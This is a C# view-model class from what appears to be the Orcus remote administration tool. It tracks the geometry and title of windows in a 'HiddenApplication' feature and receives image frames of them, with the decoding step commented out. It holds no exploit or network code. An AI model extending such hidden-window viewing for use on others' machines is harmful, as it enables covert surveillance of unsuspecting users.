using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using Orcus.Shared.Commands.HiddenApplication;
using Orcus.Shared.Utilities.Compression;

namespace Orcus.Administration.Commands.HiddenApplication
{
    public class WindowRenderInfo : INotifyPropertyChanged, IDisposable
    {
        public readonly object RenderLock = new object();
        private int _height;
        private int _codecHeight;
        private int _codecWidth;
        
        private string _title;
        private UnsafeStreamCodec _unsafeStreamCodec;
        private int _width;
        private int _x;
        private int _y;

        public WindowRenderInfo(ApplicationWindow windowInformation)
        {
            UpdateData(windowInformation);
        }

        public Bitmap Image { get; private set; }
        public DateTime LastUpdate { get; private set; }
        public long Handle { get; private set; }

        public string Title
        {
            get { return _title; }
            set
            {
                if (_title != value)
                {
                    _title = value;
                    OnPropertyChanged();
                }
            }
        }

        public int Height
        {
            get { return _height; }
            set
            {
                if (_height != value)
                {
                    _height = value;
                    OnPropertyChanged();
                }
            }
        }

        public int Width
        {
            get { return _width; }
            set
            {
                if (_width != value)
                {
                    _width = value;
                    OnPropertyChanged();
                }
            }
        }

        public int X
        {
            get { return _x; }
            set
            {
                if (_x != value)
                {
                    _x = value;
                    OnPropertyChanged();
                }
            }
        }

        public int Y
        {
            get { return _y; }
            set
            {
                if (_y != value)
                {
                    _y = value;
                    OnPropertyChanged();
                }
            }
        }

        public void Dispose()
        {
            _unsafeStreamCodec?.Dispose();
            Image?.Dispose();
        }

        public event PropertyChangedEventHandler PropertyChanged;

        public void UpdateData(ApplicationWindow windowInformation)
        {
            X = windowInformation.X;
            Y = windowInformation.Y;
            Height = windowInformation.Height;
            Width = windowInformation.Width;
            Handle = windowInformation.Handle;
        }

        public void UpdateImage(byte[] data)
        {
            var width = BitConverter.ToInt32(data, 0);
            var height = BitConverter.ToInt32(data, 4);

            lock (RenderLock)
            {
                if (_unsafeStreamCodec == null || _codecWidth != width || _codecHeight != height)
                {
                    _unsafeStreamCodec?.Dispose();
                    //_unsafeStreamCodec = new UnsafeStreamCodec(90);
                    _codecWidth = width;
                    _codecHeight = height;
                }

               // using (var memoryStream = new MemoryStream(data, 8, data.Length - 8))
                //    Image = _unsafeStreamCodec.DecodeData(memoryStream);

                LastUpdate = DateTime.Now;
            }
        }

        protected virtual void OnPropertyChanged([CallerMemberName] string propertyName = null)
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }
    }
}